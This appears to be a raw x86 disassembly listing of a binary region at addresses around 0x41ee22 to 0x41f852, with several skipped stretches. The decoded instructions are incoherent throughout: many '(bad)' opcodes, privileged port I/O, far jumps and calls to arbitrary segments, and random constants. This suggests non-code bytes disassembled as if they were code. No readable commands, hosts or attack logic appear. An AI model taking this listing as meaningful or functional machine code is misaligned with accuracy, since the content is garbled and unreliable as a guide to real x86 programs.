  41ee22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee23:	imul   ebx,DWORD PTR [edi+0x29],0x1ba18da
  41ee2a:	dec    esi
  41ee2b:	inc    esi
  41ee2c:	jge    0x41ee42
  41ee2e:	daa    
  41ee2f:	push   0xfffffff5
  41ee31:	sub    BYTE PTR [esi-0x7a],cl
  41ee34:	into   
  41ee35:	in     eax,dx
  41ee36:	push   ecx
  41ee37:	jae    0x41ee2e
  41ee39:	and    ebp,esp
  41ee3b:	inc    ebp
  41ee3c:	cmp    eax,0x346eb2ef
  41ee41:	inc    edx
  41ee42:	mov    ebp,0xac7b2bfd
  41ee47:	cmp    eax,0xda58574e
  41ee4c:	push   ebx
  41ee4d:	pop    ebp
  41ee4e:	mov    ds:0xdf16fcb9,eax
  41ee53:	mov    ds:0xee53159e,al
  41ee58:	adc    cl,BYTE PTR [ecx-0x6a]
  41ee5b:	loop   0x41ee7f
  41ee5d:	lock sbb al,0x69
  41ee60:	xchg   ebp,eax
  41ee61:	std    
  41ee62:	xchg   BYTE PTR [edi+0x70d7d6ad],cl
  41ee68:	mov    ds:0xac4e3d3f,eax
	...
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0xf273:0x687730e7
  41eee7:	dec    ebx
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	inc    DWORD PTR [eax]
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	xor    al,0x3f
  41eef0:	imul   ebx,ecx,0xffffffda
  41eef3:	and    al,0x6
  41eef5:	pop    es
  41eef6:	retf   
  41eef7:	mov    esi,0x36aa9693
  41eefc:	pop    eax
  41eefd:	jb     0x41ef43
  41eeff:	xchg   BYTE PTR [edx+eax*4+0x1f2835a],cl
  41ef06:	jmp    DWORD PTR [ebp-0x65cc9809]
  41ef0c:	lock outs dx,DWORD PTR ds:[si]
  41ef0f:	xlat   BYTE PTR ds:[ebx]
  41ef10:	jmp    0x41ef78
  41ef12:	xchg   esp,eax
  41ef13:	sub    dl,bh
  41ef15:	mov    edi,0x6289ac52
  41ef1a:	xchg   BYTE PTR [ecx+0x49e6e762],ah
  41ef20:	add    eax,0xf1e8e47c
  41ef25:	mov    cl,0x13
  41ef27:	or     eax,0xb5d8efaa
  41ef2c:	fs sysexit 
  41ef2f:	mov    ebx,0x3153937
  41ef34:	retf   
  41ef35:	loope  0x41ef2b
  41ef37:	out    dx,eax
  41ef38:	stos   DWORD PTR es:[edi],eax
  41ef39:	test   eax,0x242a26f6
  41ef3e:	aam    0xba
  41ef40:	pop    ebx
  41ef41:	mov    ebp,0xb7df8e95
  41ef46:	add    eax,DWORD PTR [edx+edx*2+0x5e5c487]
  41ef4d:	stc    
  41ef4e:	ins    DWORD PTR es:[edi],dx
  41ef4f:	xchg   edx,eax
  41ef50:	mov    ch,0xdb
  41ef52:	outs   dx,BYTE PTR ds:[esi]
  41ef53:	mov    ebx,0x55dc51f2
  41ef58:	int    0x15
  41ef5a:	out    dx,al
  41ef5b:	stos   DWORD PTR es:[edi],eax
  41ef5c:	lds    eax,FWORD PTR [ebx+esi*2+0x687d271c]
  41ef63:	lock fidivr WORD PTR [edx-0x10]
  41ef67:	inc    esi
  41ef68:	jb     0x41efad
  41ef6a:	mov    ss,WORD PTR [ecx]
  41ef6c:	jg     0x41ef42
  41ef6e:	or     dh,dl
  41ef70:	adc    dh,bl
  41ef72:	je     0x41efa5
  41ef74:	(bad)  
  41ef75:	jle    0x41efb9
  41ef77:	mov    esp,0xedb55608
  41ef7c:	cwde   
  41ef7d:	push   0xffffff8d
  41ef7f:	lahf   
  41ef80:	leave  
  41ef81:	fidiv  DWORD PTR [edi-0x6c7d0886]
  41ef87:	mov    ebx,0x69fbebcd
  41ef8c:	mov    eax,0x65aa7979
  41ef91:	ret    
  41ef92:	dec    eax
  41ef93:	shr    BYTE PTR [esi],1
  41ef95:	sbb    al,0x95
  41ef97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef98:	xchg   BYTE PTR [ebp-0x703c2114],cl
  41ef9e:	std    
  41ef9f:	out    0xc6,eax
  41efa1:	cdq    
  41efa2:	bound  ebx,QWORD PTR [eax]
  41efa4:	jmp    0x41efd4
  41efa6:	cmp    al,0x70
  41efa8:	(bad)  
  41efa9:	cwde   
  41efaa:	xor    al,0xe4
  41efad:	test   eax,0x4ee9a0d8
  41efb2:	seta   BYTE PTR [edx+0x54]
  41efb6:	and    ah,bl
  41efb8:	jecxz  0x41ef45
  41efba:	and    dh,BYTE PTR [ecx+0x33]
  41efbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efbf:	xchg   edx,eax
  41efc0:	(bad)  
  41efc1:	gs pushf 
  41efc3:	pop    ebx
  41efc4:	scas   eax,DWORD PTR es:[edi]
  41efc5:	ret    0x6ddf
  41efc8:	test   al,0x6e
  41efca:	popf   
  41efcb:	cmp    edi,esi
  41efcd:	rcr    BYTE PTR [eax],0x3e
  41efd0:	iret   
  41efd1:	call   0xb8771ed7
  41efd6:	arpl   WORD PTR [ebx-0x58],sp
  41efd9:	(bad)  
  41efdb:	test   al,0xff
  41efdd:	fwait
  41efde:	xchg   ecx,eax
  41efdf:	les    ebx,FWORD PTR [ebx+0x20a39f5d]
  41efe5:	push   0xffffffcb
  41efe7:	xchg   BYTE PTR [ecx],dl
  41efe9:	(bad)  
  41efea:	rcl    BYTE PTR [ebx+0x62],cl
	...
  41f054:	add    BYTE PTR [eax],al
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul ebp,DWORD PTR [esi*1+0x4cf1da84],0x1
  41f069:	add    bh,bh
  41f06b:	add    BYTE PTR [eax],al
  41f06d:	add    dh,ch
  41f06f:	sbb    al,0x28
  41f071:	out    dx,eax
  41f072:	(bad)
  41f076:	aaa    
  41f077:	iret   
  41f078:	mov    ah,0x5d
  41f07a:	dec    ebx
  41f07b:	out    dx,al
  41f07c:	cmp    DWORD PTR [ecx],esp
  41f07e:	cwde   
  41f07f:	mov    bl,0x7d
  41f081:	adc    BYTE PTR [ecx-0x5070f812],0xda
  41f088:	add    eax,0xc431c33
  41f08d:	inc    ebx
  41f08e:	es jl  0x41f0fc
  41f091:	outs   dx,DWORD PTR ds:[esi]
  41f092:	mov    edx,0x246503ca
  41f097:	test   DWORD PTR [ebx+0x1d],0xe562a2d9
  41f09e:	cmp    esi,DWORD PTR [eax-0x3be7ef2e]
  41f0a4:	adc    al,0xaa
  41f0a6:	ret    
  41f0a7:	pop    esp
  41f0a8:	dec    ebx
  41f0a9:	cmc    
  41f0aa:	mov    WORD PTR [edx+0x3d],gs
  41f0ad:	add    eax,0xd8d7ad23
  41f0b2:	mov    ebx,edx
  41f0b4:	jecxz  0x41f07c
  41f0b6:	inc    edi
  41f0b7:	mov    ds:0xfae6c9f9,al
  41f0bc:	jmp    0x41f078
  41f0be:	test   al,0xe8
  41f0c0:	sar    esp,0xb6
  41f0c3:	cwde   
  41f0c4:	mov    cl,0x5e
  41f0c6:	dec    eax
  41f0c7:	and    DWORD PTR [ecx],0x9052f0c4
  41f0cd:	inc    eax
  41f0ce:	sbb    edx,edx
  41f0d0:	gs scas eax,DWORD PTR es:[edi]
  41f0d2:	mov    esi,DWORD PTR [ecx+0x55]
  41f0d5:	(bad)  
  41f0d6:	pop    edx
  41f0d7:	adc    al,0x28
  41f0d9:	cmp    al,0xb5
  41f0db:	add    al,0x3c
  41f0dd:	add    BYTE PTR ds:0x1b808d47,bl
  41f0e3:	push   ss
  41f0e4:	in     al,dx
  41f0e5:	rcr    DWORD PTR [edx+0x284adb8d],0x15
  41f0ec:	repnz add eax,0xe0fd55c
  41f0f2:	aad    0xa
  41f0f4:	sbb    al,0xf9
  41f0f6:	mov    ah,0x22
  41f0f8:	mov    dl,0x2f
  41f0fa:	xchg   DWORD PTR [esi-0x3a],edx
  41f0fd:	ja     0x41f157
  41f0ff:	cmp    bh,dl
  41f101:	ins    DWORD PTR es:[edi],dx
  41f102:	daa    
  41f103:	mov    cl,0x82
  41f105:	hlt    
  41f106:	mov    ebp,?
  41f108:	imul   edi
  41f10a:	mov    dl,0xa4
  41f10c:	(bad)  
  41f10d:	rol    BYTE PTR [ebx-0x17aa237b],cl
  41f113:	xchg   ebp,eax
  41f115:	xor    ecx,DWORD PTR [ebx+0x45]
  41f118:	retf   
  41f119:	cld    
  41f11a:	sbb    al,0x27
  41f11c:	repnz sbb eax,DWORD PTR [edi-0x21]
  41f120:	fnstsw WORD PTR [ecx+0x1c]
  41f123:	(bad)  
  41f124:	mov    cl,0xc3
  41f126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f127:	sbb    ch,dl
  41f129:	or     DWORD PTR [edx+eax*2+0x2d4adcec],ebp
  41f130:	push   ds
  41f131:	fwait
  41f132:	mov    edx,cs
  41f134:	call   0x3249:0x22c71f35
  41f13b:	push   edx
  41f13c:	mov    bl,cl
  41f13e:	jecxz  0x41f1bd
  41f140:	div    DWORD PTR cs:[ebx]
  41f143:	aam    0x8e
  41f145:	push   ebx
  41f146:	inc    eax
  41f147:	push   edx
  41f148:	or     eax,DWORD PTR [eax+0x26]
  41f14b:	ret    
  41f14c:	add    al,0x1a
  41f14e:	add    ebp,DWORD PTR [edx+0x37]
  41f151:	sbb    edx,ebp
  41f153:	icebp  
  41f154:	push   ecx
  41f155:	outs   dx,DWORD PTR ds:[esi]
  41f156:	ins    DWORD PTR es:[edi],dx
  41f157:	mov    eax,0xda8985bc
  41f15c:	or     ecx,ebx
  41f15e:	or     BYTE PTR [ecx+ebp*8],dl
  41f161:	inc    esp
  41f162:	aad    0x1f
  41f164:	pop    es
  41f165:	push   0xffffffdf
  41f167:	mov    cl,0x8e
  41f169:	loopne 0x41f0f0
  41f16b:	xchg   edx,eax
  41f16c:	cmp    eax,DWORD PTR [eax]
	...
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4df0:0x8f2f35d8
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	inc    DWORD PTR [eax]
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	xchg   esp,eax
  41f1ef:	scas   eax,DWORD PTR es:[edi]
  41f1f0:	dec    ecx
  41f1f1:	stc    
  41f1f2:	scas   al,BYTE PTR es:[edi]
  41f1f3:	sti    
  41f1f4:	push   ss
  41f1f5:	bound  ebx,QWORD PTR [ebx+edx*8-0x53367f9]
  41f1fc:	enter  0x1c8b,0xb5
  41f200:	inc    edx
  41f201:	mov    al,ds:0x6e94457e
  41f206:	sbb    BYTE PTR [ecx+0x3120b8b7],ah
  41f20c:	sub    eax,0x15257621
  41f211:	pop    ebp
  41f212:	hlt    
  41f213:	test   eax,0x2ad6e503
  41f218:	inc    edx
  41f219:	cmp    al,0x4
  41f21b:	pusha  
  41f21c:	xchg   ecx,eax
  41f21d:	mov    al,ds:0x3cac0bfa
  41f222:	xchg   ebp,eax
  41f223:	jl     0x41f2a2
  41f225:	std    
  41f226:	xchg   ebx,eax
  41f227:	sbb    BYTE PTR [edx],0x11
  41f22a:	jnp    0x41f242
  41f22c:	hlt    
  41f22d:	inc    ecx
  41f22e:	es push edx
  41f230:	push   ss
  41f231:	div    dl
  41f233:	mov    al,0xb8
  41f235:	jmp    0x41f2a8
  41f237:	fnsave [ebx-0x714a0f45]
  41f23d:	popa   
  41f23e:	call   0xb27c:0xfa4367d9
  41f245:	(bad)  
  41f246:	jmp    0x41f25c
  41f248:	inc    ecx
  41f249:	nop
  41f24a:	sbb    BYTE PTR [ebx-0x42fd6110],bl
  41f250:	out    0x7d,al
  41f252:	scas   eax,DWORD PTR es:[edi]
  41f253:	fnstenv [edi-0x47]
  41f256:	mov    DWORD PTR [eax],ecx
  41f258:	mov    DWORD PTR [edi+ebp*1],edi
  41f25b:	outs   dx,BYTE PTR ds:[esi]
  41f25c:	inc    esp
  41f25d:	xor    ch,BYTE PTR [eax-0x7f]
  41f260:	sbb    DWORD PTR ds:0xeed6ab1d,ecx
  41f266:	pop    edi
  41f267:	outs   dx,DWORD PTR ds:[esi]
  41f268:	add    eax,0x7b56207e
  41f26d:	lods   al,BYTE PTR ds:[esi]
  41f26e:	sbb    BYTE PTR [edi],0xb6
  41f271:	and    DWORD PTR [eax+ecx*1-0x4f],0xffffff97
  41f276:	jns    0x41f267
  41f278:	xchg   ebp,eax
  41f279:	outs   dx,DWORD PTR ds:[si]
  41f27b:	sub    dh,BYTE PTR [esi-0x3c91a96e]
  41f281:	inc    ebx
  41f282:	les    ebp,FWORD PTR [edx+ebp*1-0x1]
  41f286:	fisttp DWORD PTR [eax]
  41f288:	ins    DWORD PTR es:[edi],dx
  41f289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f28a:	jp     0x41f2e0
  41f28c:	dec    edi
  41f28d:	push   es
  41f28e:	jns    0x41f2ea
  41f290:	xchg   ecx,eax
  41f291:	pusha  
  41f292:	jbe    0x41f2cc
  41f294:	ss mov bh,0x36
  41f297:	pop    ebx
  41f298:	jp     0x41f2c1
  41f29a:	test   al,0x99
  41f29c:	mov    ch,BYTE PTR [edi+0x386c475b]
  41f2a2:	and    DWORD PTR [ecx+0x7f],esi
  41f2a5:	xchg   esi,eax
  41f2a6:	loope  0x41f2ff
  41f2a8:	int3   
  41f2a9:	sub    DWORD PTR [esi+ecx*2+0x43fa3b11],esi
  41f2b0:	mov    edx,0xbafb3f1d
  41f2b5:	cmp    al,0xd4
  41f2b7:	add    DWORD PTR [ebx+0x163434c6],ebp
  41f2bd:	mov    bl,BYTE PTR [esi-0x4f11e3c]
  41f2c3:	mov    BYTE PTR [ebx-0x7e6a35c7],bh
  41f2c9:	jbe    0x41f269
  41f2cb:	repnz xchg esp,eax
  41f2cd:	(bad)  
  41f2cf:	xchg   esi,eax
  41f2d0:	jae    0x41f277
  41f2d2:	jbe    0x41f310
  41f2d4:	sub    BYTE PTR [ebp-0x3],dh
  41f2d7:	xlat   BYTE PTR ds:[ebx]
  41f2d8:	ret    
  41f2d9:	repz (bad) 
  41f2db:	jmp    0x7ae3:0x5c188794
  41f2e2:	xchg   edx,eax
  41f2e3:	dec    edx
  41f2e4:	imul   eax,DWORD PTR [eax+edi*1-0x7fe22c8],0x83cc
	...
  41f353:	add    BYTE PTR [eax],al
  41f355:	add    BYTE PTR [ecx+0x1b],dl
  41f358:	jmp    DWORD PTR [esi-0x1]
  41f35b:	out    0xd9,al
  41f35d:	aas    
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f3de
  41f363:	sbb    al,0x9d
  41f365:	mov    al,ds:0x14eef
  41f36a:	inc    DWORD PTR [eax]
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	leavew 
  41f370:	xor    dl,ch
  41f372:	dec    ebx
  41f373:	mov    bl,0x3d
  41f375:	cmp    BYTE PTR [ebx],ch
  41f377:	sbb    esp,DWORD PTR [esi+ecx*8+0x31]
  41f37b:	int    0x43
  41f37d:	leave  
  41f37e:	inc    eax
  41f37f:	repz retf 0x4c9f
  41f383:	mov    ah,BYTE PTR [ebp+0x1a]
  41f386:	sbb    BYTE PTR [ecx+eiz*8-0x5a95abf9],0xf8
  41f38e:	bound  esp,QWORD PTR [edx-0x2a]
  41f391:	cmc    
  41f392:	add    DWORD PTR [ecx+0x45],ebx
  41f395:	ds ja  0x41f319
  41f398:	retf   0x56fe
  41f39b:	sbb    esp,DWORD PTR cs:[esi]
  41f39e:	popf   
  41f39f:	jae    0x41f334
  41f3a1:	outs   dx,DWORD PTR ds:[esi]
  41f3a2:	xchg   ebx,eax
  41f3a3:	pop    edi
  41f3a4:	add    eax,0x8f65c280
  41f3a9:	cmp    esp,DWORD PTR cs:[edi-0x2af990eb]
  41f3b0:	mov    DWORD PTR [eax+0x7f30f537],edx
  41f3b6:	stos   DWORD PTR es:[edi],eax
  41f3b7:	cmp    edi,edx
  41f3b9:	in     al,dx
  41f3ba:	mov    ch,0x54
  41f3bc:	adc    ebp,edx
  41f3be:	loopne 0x41f418
  41f3c0:	mov    DWORD PTR [eax],edi
  41f3c2:	pmaxsw mm7,mm3
  41f3c5:	scas   al,BYTE PTR es:[edi]
  41f3c6:	fwait
  41f3c7:	xchg   edi,eax
  41f3c8:	push   ebx
  41f3c9:	and    al,0xcd
  41f3cb:	and    DWORD PTR [esi-0x72960ff],edx
  41f3d1:	push   edx
  41f3d2:	mov    WORD PTR [edx],?
  41f3d4:	fimul  DWORD PTR [ecx]
  41f3d6:	cmp    al,0xc6
  41f3d8:	mov    ebx,0xb64f5f90
  41f3dd:	jl     0x41f37f
  41f3df:	pop    edx
  41f3e0:	mov    ds:0xb5afd19d,eax
  41f3e5:	test   ecx,ebx
  41f3e7:	ret    
  41f3e8:	push   edi
  41f3e9:	and    edx,DWORD PTR [esi]
  41f3eb:	cmp    ah,BYTE PTR [ebx-0x49]
  41f3ee:	shr    DWORD PTR ds:0x9606c286,cl
  41f3f4:	xor    al,0xee
  41f3f6:	std    
  41f3f7:	pushf  
  41f3f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3f9:	rol    BYTE PTR [ebx+ebx*2-0x34077c7c],cl
  41f400:	cmp    dh,cl
  41f402:	in     eax,dx
  41f403:	sub    al,ch
  41f405:	fiadd  WORD PTR [edx-0xe7c94a6]
  41f40b:	loope  0x41f437
  41f40d:	add    BYTE PTR [esi],dh
  41f40f:	rcr    DWORD PTR [eax+0x2119435c],0xf
  41f416:	adc    ebp,DWORD PTR ds:0xf719da1a
  41f41c:	xor    DWORD PTR [edi+ecx*1],ecx
  41f41f:	sub    ah,0x9c
  41f422:	jge    0x41f3d1
  41f424:	loop   0x41f432
  41f426:	ret    
  41f427:	fadd   DWORD PTR [ecx+0xc51c7b2]
  41f42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f42e:	push   ds
  41f42f:	js     0x41f3f3
  41f431:	mov    dl,0xcc
  41f433:	clc    
  41f434:	xor    eax,0x7be15ec0
  41f439:	sub    edx,DWORD PTR [eax]
  41f43b:	stos   BYTE PTR es:[edi],al
  41f43c:	mov    ecx,0xd927ad6a
  41f441:	jp     0x41f3e2
  41f443:	mov    edx,eax
  41f445:	inc    eax
  41f446:	adc    BYTE PTR [ebx],0xaf
  41f449:	and    esi,0xffffffe4
  41f44c:	cmp    bl,ah
  41f44e:	ja     0x41f45f
  41f450:	gs pop ss
  41f452:	dec    ecx
  41f453:	and    BYTE PTR [ebx+ecx*1],ah
  41f456:	jg     0x41f40c
  41f458:	leave  
  41f459:	add    ecx,DWORD PTR [ebp-0x44]
  41f45c:	pop    esp
  41f45d:	sub    dh,BYTE PTR [ebx+esi*1-0x7a]
  41f461:	sbb    eax,DWORD PTR [ecx]
  41f463:	lods   al,BYTE PTR ds:[esi]
  41f464:	bnd jo 0x41f412
  41f467:	pop    esp
  41f468:	and    al,0x52
  41f46a:	mov    ah,0x37
  41f46c:	test   BYTE PTR [eax],al
	...
  41f4d6:	cmp    al,0xe7
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0xc7
  41f4e3:	int    0xc7
  41f4e5:	leave  
  41f4e6:	out    dx,al
  41f4e7:	dec    edi
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	inc    DWORD PTR [eax]
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	stc    
  41f4ef:	mov    eax,0x73c9f44c
  41f4f4:	iret   
  41f4f5:	mov    ds:0xe716bb32,eax
  41f4fa:	push   eax
  41f4fb:	push   cs
  41f4fc:	pop    esp
  41f4fd:	mov    al,0xfb
  41f4ff:	fsubr  QWORD PTR ds:0xc38ce1f
  41f505:	mov    ds:0x71677f81,al
  41f50a:	sub    cl,BYTE PTR [ebx]
  41f50c:	fiadd  WORD PTR [esp+edi*2]
  41f50f:	dec    edi
  41f510:	ins    DWORD PTR es:[edi],dx
  41f511:	xor    DWORD PTR [ebx],eax
  41f513:	les    esp,FWORD PTR [ebx+0x428e5423]
  41f519:	ret    
  41f51a:	jnp    0x41f556
  41f51c:	dec    DWORD PTR es:[ebp+0x3bba597e]
  41f523:	dec    edi
  41f524:	nop    DWORD PTR [ecx+0x54]
  41f528:	es xchg ebp,eax
  41f52a:	sbb    eax,0x8b4944db
  41f52f:	pop    esp
  41f530:	imul   ebx,DWORD PTR [eax+ebx*4],0x3b
  41f534:	ror    BYTE PTR [esi+0x5653155b],1
  41f53a:	or     edi,DWORD PTR [esi]
  41f53c:	lods   eax,DWORD PTR ds:[esi]
  41f53d:	packuswb mm6,QWORD PTR [ecx]
  41f540:	jl     0x41f59f
  41f542:	mov    ah,BYTE PTR [bp+di]
  41f545:	xor    BYTE PTR [ecx-0x73],cl
  41f548:	mov    dl,0xac
  41f54a:	mov    al,ds:0x5e7fa046
  41f54f:	or     al,0x12
  41f551:	sub    BYTE PTR [ecx+0x30f470a3],0x73
  41f558:	push   edx
  41f559:	shr    DWORD PTR [ebx-0x42f6bc5a],1
  41f55f:	mov    bl,0xe0
  41f561:	std    
  41f562:	sbb    al,0x8a
  41f564:	icebp  
  41f565:	xchg   esi,eax
  41f566:	xor    ebp,DWORD PTR [ebx]
  41f568:	cmp    BYTE PTR [ebx-0x5cbafe8],0xa5
  41f56f:	stos   BYTE PTR es:[edi],al
  41f570:	mov    ebx,0xc0bdd419
  41f575:	not    bl
  41f577:	outs   dx,DWORD PTR ds:[esi]
  41f578:	dec    eax
  41f579:	sahf   
  41f57a:	pop    ds
  41f57b:	fild   DWORD PTR [esi+0x45e0ca97]
  41f581:	lahf   
  41f582:	jg     0x41f51e
  41f584:	std    
  41f585:	cmp    ebx,eax
  41f587:	mov    eax,DWORD PTR ds:0x4dbead00
  41f58d:	icebp  
  41f58e:	outs   dx,BYTE PTR ds:[esi]
  41f58f:	pop    esp
  41f590:	mov    edi,0xfa0c2520
  41f595:	ja     0x41f5ff
  41f597:	or     al,0x77
  41f599:	div    DWORD PTR [esi-0x2b2a21fa]
  41f59f:	fadd   QWORD PTR [edx-0x7]
  41f5a2:	(bad)  
  41f5a3:	int3   
  41f5a4:	es daa 
  41f5a6:	(bad)  [edi]
  41f5a8:	loope  0x41f59e
  41f5aa:	mov    eax,0xe82a3bfc
  41f5af:	das    
  41f5b0:	setle  ah
  41f5b3:	push   0x20
  41f5b5:	push   esi
  41f5b6:	mov    eax,0xe97f00cc
  41f5bb:	sub    ah,ah
  41f5bd:	retf   
  41f5be:	out    dx,eax
  41f5bf:	sahf   
  41f5c0:	xor    edi,eax
  41f5c2:	fisub  DWORD PTR ds:0x4eea9acc
  41f5c8:	jmp    0xfd05:0xc6104643
  41f5cf:	sbb    BYTE PTR [eax-0xe501ddb],al
  41f5d5:	adc    al,BYTE PTR [ecx-0x705b9974]
  41f5db:	cs push esi
  41f5dd:	outs   dx,BYTE PTR ds:[esi]
  41f5de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5df:	and    BYTE PTR [ebx],0x34
  41f5e2:	aad    0x27
  41f5e4:	inc    edx
  41f5e5:	push   ecx
  41f5e6:	or     ebx,DWORD PTR [edi]
  41f5e8:	mov    DWORD PTR [eax+ecx*1],edi
  41f5eb:	mov    edi,0xdf
	...
  41f654:	add    BYTE PTR [eax],al
  41f656:	js     0x41f68c
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x30aa:0x2dcad422
  41f666:	in     eax,dx
  41f667:	push   eax
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	inc    DWORD PTR [eax]
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	in     al,0x80
  41f670:	out    0xea,eax
  41f672:	rcl    BYTE PTR [eax-0x50],cl
  41f675:	jle    0x41f6bb
  41f677:	cwde   
  41f678:	test   BYTE PTR [edi-0x1a8be080],bh
  41f67e:	xor    DWORD PTR [ecx-0x49],eax
  41f681:	cmp    DWORD PTR [edx-0x6f16e4d1],ebp
  41f687:	(bad)  
  41f688:	call   0xe762fa
  41f68d:	add    eax,0xadbe2065
  41f692:	lahf   
  41f693:	jecxz  0x41f69d
  41f695:	daa    
  41f696:	je     0x41f65e
  41f698:	sub    ch,bl
  41f69a:	push   0x108204da
  41f69f:	mov    bl,0x48
  41f6a1:	inc    eax
  41f6a2:	into   
  41f6a3:	je     0x41f676
  41f6a5:	sub    cl,BYTE PTR [edx+0x39]
  41f6a8:	mov    dl,0x39
  41f6aa:	sbb    dl,0x2e
  41f6ad:	das    
  41f6ae:	adc    dh,BYTE PTR [eax]
  41f6b0:	cmp    ebp,DWORD PTR [ecx+0xda95ef7]
  41f6b6:	in     eax,dx
  41f6b7:	xor    al,0xfd
  41f6b9:	ret    0x2a49
  41f6bc:	or     ebp,ecx
  41f6be:	loopne 0x41f684
  41f6c0:	xchg   edi,eax
  41f6c1:	jp     0x41f71e
  41f6c3:	mov    bl,0xa6
  41f6c5:	pop    esp
  41f6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6c7:	mov    edx,0xd70946c7
  41f6cc:	inc    esi
  41f6cd:	cmp    edi,DWORD PTR [edi+0x7bd949b9]
  41f6d3:	add    al,0x1d
  41f6d5:	ja     0x41f690
  41f6d7:	xchg   BYTE PTR [ebp+0x35d19343],al
  41f6dd:	jo     0x41f75c
  41f6df:	(bad)  
  41f6e0:	pop    ds
  41f6e1:	pushf  
  41f6e2:	pop    esp
  41f6e3:	sub    BYTE PTR [ebp+0x2a],cl
  41f6e6:	and    eax,0xf8ffe680
  41f6eb:	dec    ecx
  41f6ec:	fwait
  41f6ed:	repnz ins DWORD PTR es:[edi],dx
  41f6ef:	push   ebx
  41f6f0:	test   al,0x7e
  41f6f2:	dec    ecx
  41f6f3:	iret   
  41f6f4:	data16 or al,0xf4
  41f6f7:	add    eax,0x66c466c1
  41f6fc:	mov    bh,0xd3
  41f6fe:	pop    eax
  41f6ff:	test   al,0xeb
  41f701:	mov    cl,bh
  41f703:	sbb    DWORD PTR [edx-0xb],edi
  41f706:	lock jg 0x41f76c
  41f709:	mov    ch,0x7b
  41f70b:	in     eax,dx
  41f70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f70d:	cmp    eax,0xbed3e095
  41f712:	pop    edi
  41f713:	jmp    0x41f6f2
  41f715:	jo     0x41f768
  41f717:	clc    
  41f718:	ficom  DWORD PTR [edx]
  41f71a:	out    0x75,eax
  41f71c:	sbb    BYTE PTR [esi+0x13],al
  41f71f:	gs mov bl,0x4e
  41f722:	vpsrlq ymm2,ymm4,XMMWORD PTR [eax-0x53]
  41f727:	jns    0x41f734
  41f729:	rcl    ebp,0x1a
  41f72c:	xchg   DWORD PTR [eax+0x291443ed],ebp
  41f732:	dec    ecx
  41f733:	cmp    BYTE PTR [ebx-0x3d],0x9f
  41f737:	jle    0x41f6f3
  41f739:	jg     0x41f770
  41f73b:	js     0x41f737
  41f73d:	pop    eax
  41f73e:	adc    eax,0xde304cca
  41f743:	mov    WORD PTR [edx+0x5256e0f9],?
  41f749:	shr    BYTE PTR [ebp+0x58],1
  41f74c:	in     eax,0xe2
  41f74e:	add    ebx,DWORD PTR [edi+eiz*4+0xee48deb]
  41f755:	push   0x4fa14d9d
  41f75a:	rol    dh,0x96
  41f75d:	or     esi,DWORD PTR [ebx+0x71c5e208]
  41f763:	pop    esi
  41f764:	mov    dl,BYTE PTR [ecx-0x2558f004]
  41f76a:	mov    cl,0x6c
  41f76c:	sbb    eax,0x0
	...
  41f7d5:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0xbb87:0x3b6c62d2
  41f7e5:	pop    ebp
  41f7e6:	in     al,dx
  41f7e7:	push   ecx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	inc    DWORD PTR [eax]
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	xor    edx,edx
  41f7f0:	test   BYTE PTR [ebx],al
  41f7f2:	xor    bl,dl
  41f7f4:	pop    ebx
  41f7f5:	pop    ss
  41f7f6:	mov    DWORD PTR [esi+edx*4],esp
  41f7f9:	mov    eax,ds:0x3478f68d
  41f7fe:	jnp    0x41f861
  41f800:	cmc    
  41f801:	sub    esp,DWORD PTR ds:0x721db355
  41f807:	mov    ecx,0x2319fc71
  41f80c:	xchg   ebx,eax
  41f80d:	sbb    esi,edi
  41f80f:	pop    edi
  41f810:	adc    BYTE PTR [esi],cl
  41f812:	or     eax,0xb26c94a8
  41f817:	fwait
  41f818:	iret   
  41f819:	sti    
  41f81a:	lods   al,BYTE PTR ds:[esi]
  41f81b:	ss jns 0x41f82d
  41f81e:	mov    ss,WORD PTR ds:0x5a628963
  41f824:	fs jnp 0x41f835
  41f827:	push   edi
  41f828:	js     0x41f7ad
  41f82a:	pop    es
  41f82b:	inc    edx
  41f82c:	das    
  41f82d:	mov    bl,0x6
  41f82f:	add    BYTE PTR [edx],bl
  41f831:	sub    ebp,DWORD PTR [ebx-0x79be1c28]
  41f837:	mov    eax,0x20e904aa
  41f83c:	jmp    0xffe7:0x861cf95f
  41f843:	mov    ebx,0x17d1fcc2
  41f848:	fidivr DWORD PTR [edi]
  41f84a:	pop    esp
  41f84b:	arpl   WORD PTR ds:[eax-0x12d72baa],cx
  41f852:	and    al,0xc3
